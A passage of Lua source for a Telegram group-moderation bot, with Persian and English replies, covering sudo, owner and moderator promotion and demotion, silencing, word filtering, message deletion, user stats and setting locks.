          return SendStatus(arg.chat_id, data.id_, "Promoted To Sudo", "\216\168\217\135 \216\179\217\136\216\175\217\136 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
        end
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, SetSudo_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
  elseif lang then
    return tdcli.sendMessage(data.chat_id_, "", 0, "`\217\190\219\140\216\175\216\167 \217\134\216\180\216\175`", 0, "md")
  else
    return tdcli.sendMessage(data.chat_id_, "", 0, "`Not Found`", 0, "md")
  end
end
local action_by_username2 = function(arg, data)
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  if not arg.username then
    return false
  end
  if data.id_ then
    if cmd == "delsudo" then
      if not already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Sudo", "\216\179\217\136\216\175\217\136 \217\134\216\168\217\136\216\175")
      end
      redis:srem("BotHaveRankMembers", tonumber(data.id_))
      table.remove(_config.sudo_users, getindex(_config.sudo_users, tonumber(data.id_)))
      save_config()
      reload_plugins(true)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Sudo", "\216\175\219\140\218\175\217\135 \216\179\217\136\216\175\217\136 \217\134\219\140\216\179\216\170!")
    end
    if cmd == "setsudo" then
      if already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Sudo", "\216\167\216\178 \217\130\216\168\217\132 \216\179\217\136\216\175\217\136 \216\168\217\136\216\175")
      else
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        redis:sadd("SudoAccess" .. data.id_, "installgroups")
        redis:sadd("SudoAccess" .. data.id_, "removegroups")
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        table.insert(_config.sudo_users, tonumber(data.id_))
        save_config()
        plugins = {}
        load_plugins()
        return SendStatus(arg.chat_id, data.id_, "Promoted To Sudo", "\216\168\217\135 \216\179\217\136\216\175\217\136 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
      end
    end
  elseif lang then
    return tdcli.sendMessage(arg.chat_id, "", 0, "`\217\190\219\140\216\175\216\167 \217\134\216\180\216\175`", 0, "md")
  else
    return tdcli.sendMessage(arg.chat_id, "", 0, "`Not Found`", 0, "md")
  end
end
local action_by_id2 = function(arg, data)
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  if not tonumber(arg.user_id) then
    return false
  end
  if data.id_ then
    if data.username_ then
      user_name = "@" .. UseMark(data.username_)
    else
      user_name = UseMark(data.first_name_)
    end
    if cmd == "delsudo" then
      if not already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Sudo", "\216\179\217\136\216\175\217\136 \217\134\216\168\217\136\216\175")
      end
      redis:srem("BotHaveRankMembers", tonumber(data.id_))
      table.remove(_config.sudo_users, getindex(_config.sudo_users, tonumber(data.id_)))
      save_config()
      reload_plugins(true)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Sudo", "\216\175\219\140\218\175\217\135 \216\179\217\136\216\175\217\136 \217\134\219\140\216\179\216\170!")
    end
    if cmd == "setsudo" then
      if already_sudo(data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Sudo", "\216\167\216\178 \217\130\216\168\217\132 \216\179\217\136\216\175\217\136 \216\168\217\136\216\175")
      else
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        redis:sadd("SudoAccess" .. data.id_, "installgroups")
        redis:sadd("SudoAccess" .. data.id_, "removegroups")
        redis:sadd("BotHaveRankMembers", tonumber(data.id_))
        table.insert(_config.sudo_users, tonumber(data.id_))
        save_config()
        plugins = {}
        load_plugins()
        return SendStatus(arg.chat_id, data.id_, "Promoted To Sudo", "\216\168\217\135 \216\179\217\136\216\175\217\136 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
      end
    end
  elseif lang then
    return tdcli.sendMessage(arg.chat_id, "", 0, "`\217\190\219\140\216\175\216\167 \217\134\216\180\216\175`", 0, "md")
  else
    return tdcli.sendMessage(arg.chat_id, "", 0, "`Not Found`", 0, "md")
  end
end
local filter_word = function(msg, word)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if redis:sismember("GroupFilterList:" .. msg.to.id, word) then
    redis:srem("GroupFilterList:" .. msg.to.id, word)
    if not lang then
      text = "*Word:* `" .. word .. [[
`
*Status:* `Unfiltered`]]
      tdcli.sendMessage(msg.to.id, 0, 1, text, 1, "md")
    elseif lang then
      text = "*\218\169\217\132\217\133\217\135:* `" .. word .. "`\n*\217\136\216\182\216\185\219\140\216\170:* `\217\129\219\140\217\132\216\170\216\177 \216\168\216\177\216\175\216\167\216\180\216\170\217\135 \216\180\216\175`"
      tdcli.sendMessage(msg.to.id, 0, 1, text, 1, "md")
    end
  else
    redis:sadd("GroupFilterList:" .. msg.to.id, word)
    if not lang then
      text = "*Word:* `" .. word .. [[
`
*Status:* `Filtered`]]
      tdcli.sendMessage(msg.to.id, 0, 1, text, 1, "md")
    else
      text = "*\218\169\217\132\217\133\217\135:* `" .. word .. "`\n*\217\136\216\182\216\185\219\140\216\170:* `\217\129\219\140\217\132\216\170\216\177 \216\180\216\175`"
      tdcli.sendMessage(msg.to.id, 0, 1, text, 1, "md")
    end
  end
end
local action_by_reply_ = function(arg, data)
  local hash = "gp_lang:" .. data.chat_id_
  local lang = redis:get(hash)
  local cmd = arg.cmd
  if not tonumber(data.sender_user_id_) then
    return false
  end
  if data.sender_user_id_ then
    if cmd == "silent" then
      local silent_cb = function(arg, data)
        local hash = "gp_lang:" .. arg.chat_id
        local lang = redis:get(hash)
        if data.username_ then
          user_name = "@" .. UseMark(data.username_)
        else
          user_name = UseMark(data.first_name_)
        end
        if isModerator(arg.chat_id, data.id_) then
          return NoAccess(arg.chat_id)
        end
        if redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
          return SendStatus(arg.chat_id, data.id_, "Already Silent", "\216\167\216\178 \217\130\216\168\217\132 \216\179\216\167\218\169\216\170 \216\168\217\136\216\175")
        end
        redis:sadd("GroupSilentUsers:" .. arg.chat_id, data.id_)
        return SendStatus(arg.chat_id, data.id_, "Silented", "\216\179\216\167\218\169\216\170 \216\180\216\175")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, silent_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "unsilent" then
      local unsilent_cb = function(arg, data)
        local hash = "gp_lang:" .. arg.chat_id
        local lang = redis:get(hash)
        if data.username_ then
          user_name = "@" .. UseMark(data.username_)
        else
          user_name = UseMark(data.first_name_)
        end
        if not redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
          return SendStatus(arg.chat_id, data.id_, "is Not Silent", "\216\179\216\167\218\169\216\170 \217\134\216\168\217\136\216\175")
        end
        redis:srem("GroupSilentUsers:" .. arg.chat_id, data.id_)
        return SendStatus(arg.chat_id, data.id_, "Unsilented", "\216\175\219\140\218\175\217\135 \216\179\216\167\218\169\216\170 \217\134\219\140\216\179\216\170!")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, unsilent_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "delall" then
      if isModerator(data.chat_id_, data.sender_user_id_) then
        return NoAccess(arg.chat_id)
      else
        tdcli.deleteMessagesFromUser(data.chat_id_, data.sender_user_id_, dl_cb, nil)
        return SendStatus(arg.chat_id, data.id_, "All Messages Deleted", "\217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175")
      end
    end
  elseif lang then
    return tdcli.sendMessage(data.chat_id_, "", 0, "`\217\190\219\140\216\175\216\167 \217\134\216\180\216\175`", 0, "md")
  else
    return tdcli.sendMessage(data.chat_id_, "", 0, "`Not Found`", 0, "md")
  end
end
local action_by_username_ = function(arg, data)
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not arg.username then
    return false
  end
  if data.id_ then
    if data.type_.user_.username_ then
      user_name = "@" .. UseMark(data.type_.user_.username_)
    else
      user_name = UseMark(data.title_)
    end
    if cmd == "silent" then
      if isModerator(arg.chat_id, data.id_) then
        return NoAccess(arg.chat_id)
      end
      if redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
        return SendStatus(arg.chat_id, data.id_, "Already Silent", "\216\167\216\178 \217\130\216\168\217\132 \216\179\216\167\218\169\216\170 \216\168\217\136\216\175")
      end
      redis:sadd("GroupSilentUsers:" .. arg.chat_id, data.id_)
      return SendStatus(arg.chat_id, data.id_, "Silented", "\216\179\216\167\218\169\216\170 \216\180\216\175")
    end
    if cmd == "unsilent" then
      if not redis:sismember("GroupSilentUsers:" .. arg.chat_id, data.id_) then
        return SendStatus(arg.chat_id, data.id_, "is Not Silent", "\216\179\216\167\218\169\216\170 \217\134\216\168\217\136\216\175")
      end
      redis:srem("GroupSilentUsers:" .. arg.chat_id, data.id_)
      return SendStatus(arg.chat_id, data.id_, "Unsilented!", "\216\175\219\140\218\175\217\135 \216\179\216\167\218\169\216\170 \217\134\219\140\216\179\216\170!")
    end
    if cmd == "delall" then
      if isModerator(arg.chat_id, data.id_) then
        return NoAccess(arg.chat_id)
      else
        tdcli.deleteMessagesFromUser(arg.chat_id, data.id_, dl_cb, nil)
        return SendStatus(arg.chat_id, data.id_, "All Messages Deleted", "\217\135\217\133\217\135 \217\190\219\140\216\167\217\133 \217\135\216\167 \217\190\216\167\218\169 \216\180\216\175\217\134\216\175")
      end
    end
  elseif lang then
    return tdcli.sendMessage(arg.chat_id, "", 0, "`\217\190\219\140\216\175\216\167 \217\134\216\180\216\175`", 0, "md")
  else
    return tdcli.sendMessage(arg.chat_id, "", 0, "`Not Found`", 0, "md")
  end
end
local modlist = function(msg)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  local i = 1
  if not data[tostring(msg.to.id)] then
    if not lang then
      return "`Group is not installed`"
    else
      return "\218\175\216\177\217\136\217\135 \216\168\217\135 \217\132\219\140\216\179\216\170 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\133\216\175\219\140\216\177\219\140\216\170\219\140 \216\177\216\168\216\167\216\170 \216\167\216\182\216\167\217\129\217\135 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170"
    end
  end
  if next(data[tostring(msg.to.id)].mods) == nil then
    if not lang then
      return "*No* *moderator* `in this group`"
    else
      return "\217\133\216\175\219\140\216\177\219\140 \217\136\216\172\217\136\216\175 \217\134\216\175\216\167\216\177\216\175"
    end
  end
  if not lang then
    message = "*List of moderators :*\n"
  else
    message = "*\217\132\219\140\216\179\216\170 \217\133\216\175\219\140\216\177\216\167\217\134 \218\175\216\177\217\136\217\135 :*\n"
  end
  for k, v in pairs(data[tostring(msg.to.id)].mods) do
    message = message .. i .. "- " .. v .. " [" .. k .. "] \n"
    i = i + 1
  end
  return message
end
local ownerlist = function(msg)
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  local data = load_data("./data/moderation.json")
  local i = 1
  if not data[tostring(msg.to.id)] then
    if not lang then
      return "`Group is not installed`"
    else
      return "`\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170`"
    end
  end
  if next(data[tostring(msg.to.id)].owners) == nil then
    if not lang then
      return "*No owners was not found in this group*"
    else
      return "*\217\135\219\140\218\134 \216\181\216\167\216\173\216\168\219\140 \216\175\216\177 \216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \219\140\216\167\217\129\216\170 \217\134\216\180\216\175*"
    end
  else
    if not lang then
      message = "*List of moderators :*\n"
    else
      message = "*\217\132\219\140\216\179\216\170 \216\181\216\167\216\173\216\168\216\167\217\134 \218\175\216\177\217\136\217\135 :*\n"
    end
    for k, v in pairs(data[tostring(msg.to.id)].owners) do
      message = message .. i .. "- " .. v .. " [" .. k .. "] \n"
      i = i + 1
    end
  end
  return message
end
local action_by_reply = function(arg, data)
  local hash = "gp_lang:" .. data.chat_id_
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not tonumber(data.sender_user_id_) then
    return false
  end
  if data.sender_user_id_ then
    if not administration[tostring(data.chat_id_)] then
      if not lang then
        return tdcli.sendMessage(data.chat_id_, "", 0, "`Group is not installed`", 0, "md")
      else
        return tdcli.sendMessage(data.chat_id_, "", 0, "`\218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170`", 0, "md")
      end
    end
    if cmd == "setowner" then
      local owner_cb = function(arg, data)
        local hash = "gp_lang:" .. arg.chat_id
        local lang = redis:get(hash)
        local administration = load_data("./data/moderation.json")
        if data.username_ then
          user_name = "@" .. UseMark(data.username_)
        else
          user_name = UseMark(data.first_name_)
        end
        if administration[tostring(arg.chat_id)].owners[tostring(data.id_)] then
          return SendStatus(arg.chat_id, data.id_, "Already owner", "\216\167\216\178 \217\130\216\168\217\132 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\168\217\136\216\175")
        end
        redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
        administration[tostring(arg.chat_id)].owners[tostring(data.id_)] = user_name
        save_data("./data/moderation.json", administration)
        return SendStatus(arg.chat_id, data.id_, "Promoted To owner", "\216\168\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, owner_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "promote" then
      local promote_cb = function(arg, data)
        local hash = "gp_lang:" .. arg.chat_id
        local lang = redis:get(hash)
        local administration = load_data("./data/moderation.json")
        if data.username_ then
          user_name = "@" .. UseMark(data.username_)
        else
          user_name = UseMark(data.first_name_)
        end
        if administration[tostring(arg.chat_id)].mods[tostring(data.id_)] then
          return SendStatus(arg.chat_id, data.id_, "Already Moderator", "\216\167\216\178 \217\130\216\168\217\132 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \216\168\217\136\216\175")
        end
        redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
        administration[tostring(arg.chat_id)].mods[tostring(data.id_)] = user_name
        save_data("./data/moderation.json", administration)
        return SendStatus(arg.chat_id, data.id_, "Promoted To Moderator", "\216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \218\175\216\177\217\136\217\135 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, promote_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "delowner" then
      local rem_owner_cb = function(arg, data)
        local hash = "gp_lang:" .. arg.chat_id
        local lang = redis:get(hash)
        local administration = load_data("./data/moderation.json")
        if data.username_ then
          user_name = "@" .. UseMark(data.username_)
        else
          user_name = UseMark(data.first_name_)
        end
        if not administration[tostring(arg.chat_id)].owners[tostring(data.id_)] then
          return SendStatus(arg.chat_id, data.id_, "is Not owner", "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\134\216\168\217\136\216\175")
        end
        redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
        administration[tostring(arg.chat_id)].owners[tostring(data.id_)] = nil
        save_data("./data/moderation.json", administration)
        return SendStatus(arg.chat_id, data.id_, "Demoted From owner", "\216\175\219\140\218\175\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\134\219\140\216\179\216\170!")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, rem_owner_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "demote" then
      local demote_cb = function(arg, data)
        local administration = load_data("./data/moderation.json")
        if data.username_ then
          user_name = "@" .. UseMark(data.username_)
        else
          user_name = UseMark(data.first_name_)
        end
        if not administration[tostring(arg.chat_id)].mods[tostring(data.id_)] then
          return SendStatus(arg.chat_id, data.id_, "is Not Moderator", "\217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \217\134\216\168\217\136\216\175")
        end
        redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
        administration[tostring(arg.chat_id)].mods[tostring(data.id_)] = nil
        save_data("./data/moderation.json", administration)
        return SendStatus(arg.chat_id, data.id_, "Demoted From Moderator", "\216\175\219\140\218\175\217\135 \217\133\216\175\219\140\216\177 \217\134\219\140\216\179\216\170!")
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, demote_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
    if cmd == "id" then
      local id_cb = function(arg, data)
        GpChats = redis:get("getMessages:" .. arg.chat_id) or 0
        UsChats = redis:get("getMessages:" .. data.id_ .. ":" .. arg.chat_id) or 0
        Percent_ = tonumber(UsChats) / tonumber(GpChats) * 100
        if Percent_ < 10 then
          Percent = "0" .. string.sub(Percent_, 1, 4)
        elseif Percent_ >= 10 then
          Percent = string.sub(Percent_, 1, 5)
        end
        if 10 >= tonumber(Percent) then
          if not lang then
            UsStatus = "Weak \240\159\152\180"
          else
            UsStatus = "\216\182\216\185\219\140\217\129 \240\159\152\180"
          end
        elseif tonumber(Percent) <= 20 then
          if not lang then
            UsStatus = "Normal \240\159\152\138"
          else
            UsStatus = "\217\133\216\185\217\133\217\136\217\132\219\140 \240\159\152\138"
          end
        elseif 100 >= tonumber(Percent) then
          if not lang then
            UsStatus = "Active \240\159\152\142"
          else
            UsStatus = "\217\129\216\185\216\167\217\132 \240\159\152\142"
          end
        end
        if not lang then
          return tdcli.sendMessage(arg.chat_id, "", 0, "*ID:* (`" .. data.id_ .. [[
`)

*Number of User Messages:* `]] .. UsChats .. [[
`
*Messages Percent:* %]] .. Percent .. [[

*Status:* ]] .. UsStatus, 0, "md")
        else
          return tdcli.sendMessage(arg.chat_id, "", 0, "\216\162\219\140\216\175\219\140: (`" .. data.id_ .. "`)\n\n\216\170\216\185\216\175\216\167\216\175 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\169\216\167\216\177\216\168\216\177: `" .. UsChats .. "`\n\216\175\216\177\216\181\216\175 \217\190\219\140\216\167\217\133 \217\135\216\167: " .. Percent .. "%\n\217\136\216\182\216\185\219\140\216\170: " .. UsStatus, 0, "md")
        end
      end
      tdcli_function({
        ID = "GetUser",
        user_id_ = data.sender_user_id_
      }, id_cb, {
        chat_id = data.chat_id_,
        user_id = data.sender_user_id_
      })
    end
  elseif lang then
    return tdcli.sendMessage(data.chat_id_, "", 0, "`\217\190\219\140\216\175\216\167 \217\134\216\180\216\175`", 0, "md")
  else
    return tdcli.sendMessage(data.chat_id_, "", 0, "`Not Found`", 0, "md")
  end
end
local action_by_username = function(arg, data)
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not administration[tostring(arg.chat_id)] then
    if not lang then
      return tdcli.sendMessage(data.chat_id_, "", 0, "`Group is not installed`", 0, "md")
    else
      return tdcli.sendMessage(data.chat_id_, "", 0, "`\218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170`", 0, "md")
    end
  end
  if not arg.username then
    return false
  end
  if data.id_ then
    if data.type_.user_.username_ then
      user_name = "@" .. UseMark(data.type_.user_.username_)
    else
      user_name = UseMark(data.title_)
    end
    if cmd == "setowner" then
      if administration[tostring(arg.chat_id)].owners[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already owner", "\216\167\216\178 \217\130\216\168\217\132 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\168\217\136\216\175")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].owners[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To owner", "\216\168\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
    end
    if cmd == "promote" then
      if administration[tostring(arg.chat_id)].mods[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already Moderator", "\216\167\216\178 \217\130\216\168\217\132 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \216\168\217\136\216\175")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].mods[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To Moderator", "\216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \218\175\216\177\217\136\217\135 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
    end
    if cmd == "delowner" then
      if not administration[tostring(arg.chat_id)].owners[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not owner", "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\134\216\168\217\136\216\175")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].owners[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From owner", "\216\175\219\140\218\175\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\134\219\140\216\179\216\170!")
    end
    if cmd == "demote" then
      if not administration[tostring(arg.chat_id)].mods[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not Moderator", "\217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \217\134\216\168\217\136\216\175")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].mods[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Moderator", "\216\175\219\140\218\175\217\135 \217\133\216\175\219\140\216\177 \217\134\219\140\216\179\216\170!")
    end
    if cmd == "id" then
      GpChats = redis:get("getMessages:" .. arg.chat_id) or 0
      UsChats = redis:get("getMessages:" .. data.id_ .. ":" .. arg.chat_id) or 0
      Percent_ = tonumber(UsChats) / tonumber(GpChats) * 100
      if Percent_ < 10 then
        Percent = "0" .. string.sub(Percent_, 1, 4)
      elseif Percent_ >= 10 then
        Percent = string.sub(Percent_, 1, 5)
      end
      if 10 >= tonumber(Percent) then
        if not lang then
          UsStatus = "Weak \240\159\152\180"
        else
          UsStatus = "\216\182\216\185\219\140\217\129 \240\159\152\180"
        end
      elseif tonumber(Percent) <= 20 then
        if not lang then
          UsStatus = "Normal \240\159\152\138"
        else
          UsStatus = "\217\133\216\185\217\133\217\136\217\132\219\140 \240\159\152\138"
        end
      elseif 100 >= tonumber(Percent) then
        if not lang then
          UsStatus = "Active \240\159\152\142"
        else
          UsStatus = "\217\129\216\185\216\167\217\132 \240\159\152\142"
        end
      end
      if not lang then
        return tdcli.sendMessage(arg.chat_id, "", 0, "*ID:* (`" .. data.id_ .. [[
`)

*Number of User Messages:* `]] .. UsChats .. [[
`
*Messages Percent:* %]] .. Percent .. [[

*Status:* ]] .. UsStatus, 0, "md")
      else
        return tdcli.sendMessage(arg.chat_id, "", 0, "\216\162\219\140\216\175\219\140: (`" .. data.id_ .. "`)\n\n\216\170\216\185\216\175\216\167\216\175 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \218\169\216\167\216\177\216\168\216\177: `" .. UsChats .. "`\n\216\175\216\177\216\181\216\175 \217\190\219\140\216\167\217\133 \217\135\216\167: " .. Percent .. "%\n\217\136\216\182\216\185\219\140\216\170: " .. UsStatus, 0, "md")
      end
    end
    if cmd == "allow" then
      user = data.id_
      chat = arg.chat_id
      if not redis:sismember("AllowUserFrom~" .. chat, user) then
        redis:sadd("AllowUserFrom~" .. chat, user)
        SendStatus(chat, user, "Added", "\216\167\216\182\216\167\217\129\217\135 \216\180\216\175")
      else
        redis:srem("AllowUserFrom~" .. chat, user)
        SendStatus(chat, user, "Removed", "\216\173\216\176\217\129 \216\180\216\175")
      end
    end
    if cmd == "res" then
      if not lang then
        text = "Result for [ " .. UseMark(data.type_.user_.username_) .. " ] :\n" .. "" .. UseMark(data.title_) .. "\n" .. " [" .. data.id_ .. "]"
      else
        text = "\216\167\216\183\217\132\216\167\216\185\216\167\216\170 \216\168\216\177\216\167\219\140 [ " .. UseMark(data.type_.user_.username_) .. " ] :\n" .. "" .. UseMark(data.title_) .. "\n" .. " [" .. data.id_ .. "]"
      end
      return tdcli.sendMessage(arg.chat_id, 0, 1, text, 1, "md")
    end
  end
end
local action_by_id = function(arg, data)
  local hash = "gp_lang:" .. arg.chat_id
  local lang = redis:get(hash)
  local cmd = arg.cmd
  local administration = load_data("./data/moderation.json")
  if not administration[tostring(arg.chat_id)] then
    if not lang then
      return tdcli.sendMessage(data.chat_id_, "", 0, "`Group is not installed`", 0, "md")
    else
      return tdcli.sendMessage(data.chat_id_, "", 0, "`\218\175\216\177\217\136\217\135 \217\134\216\181\216\168 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170`", 0, "md")
    end
  end
  if not tonumber(arg.user_id) then
    return false
  end
  if data.id_ and data.first_name_ then
    if data.username_ then
      user_name = "@" .. UseMark(data.username_)
    else
      user_name = UseMark(data.first_name_)
    end
    if cmd == "setowner" then
      if administration[tostring(arg.chat_id)].owners[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already owner", "\216\167\216\178 \217\130\216\168\217\132 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\168\217\136\216\175")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].owners[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To owner", "\216\168\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
    end
    if cmd == "promote" then
      if administration[tostring(arg.chat_id)].mods[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "Already Moderator", "\216\167\216\178 \217\130\216\168\217\132 \217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \216\168\217\136\216\175")
      end
      redis:sadd("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].mods[tostring(data.id_)] = user_name
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Promoted To Moderator", "\216\168\217\135 \217\133\216\175\219\140\216\177\219\140\216\170 \218\175\216\177\217\136\217\135 \216\167\216\177\216\170\217\130\216\167 \219\140\216\167\217\129\216\170")
    end
    if cmd == "delowner" then
      if not administration[tostring(arg.chat_id)].owners[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not owner", "\216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\134\216\168\217\136\216\175")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].owners[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From owner", "\216\175\219\140\218\175\217\135 \216\181\216\167\216\173\216\168 \218\175\216\177\217\136\217\135 \217\134\219\140\216\179\216\170!")
    end
    if cmd == "demote" then
      if not administration[tostring(arg.chat_id)].mods[tostring(data.id_)] then
        return SendStatus(arg.chat_id, data.id_, "is Not Moderator", "\217\133\216\175\219\140\216\177 \218\175\216\177\217\136\217\135 \217\134\216\168\217\136\216\175")
      end
      redis:srem("BotHaveRankMembers(Group)" .. arg.chat_id, data.id_)
      administration[tostring(arg.chat_id)].mods[tostring(data.id_)] = nil
      save_data("./data/moderation.json", administration)
      return SendStatus(arg.chat_id, data.id_, "Demoted From Moderator", "\216\175\219\140\218\175\217\135 \217\133\216\175\219\140\216\177 \217\134\219\140\216\179\216\170!")
    end
  end
end
function getChatHistory(chat_id, from_message_id, offset, limit, dl_cb, cmd)
  if not limit or limit > 100 then
    limit = 100
  end
  tdcli_function({
    ID = "GetChatHistory",
    chat_id_ = chat_id,
    from_message_id_ = from_message_id,
    offset_ = offset or 0,
    limit_ = limit
  }, dl_cb, cmd)
end
local lock_item = function(msg, NAME, EN, FA, VAR)
  local NameEN = EN
  local NameFA = FA
  local hash = "gp_lang:" .. msg.to.id
  local lang = redis:get(hash)
  if not is_mod(msg) then
    if not lang then
      return accessEN(msg)
    else
      return accessFA(msg)
    end
  end
  if NAME == "flood" then
    L = redis:hget("GroupSettings:" .. msg.to.id, NAME)
  else
    L = redis:hget("GroupSettings:" .. msg.to.id, "lock_" .. NAME)
  end
  if L == "yes" then
    if NAME == "flood" then
      redis:hdel("GroupSettings:" .. msg.to.id, NAME)
    else
      redis:hdel("GroupSettings:" .. msg.to.id, "lock_" .. NAME)
    end
    if VAR == true then
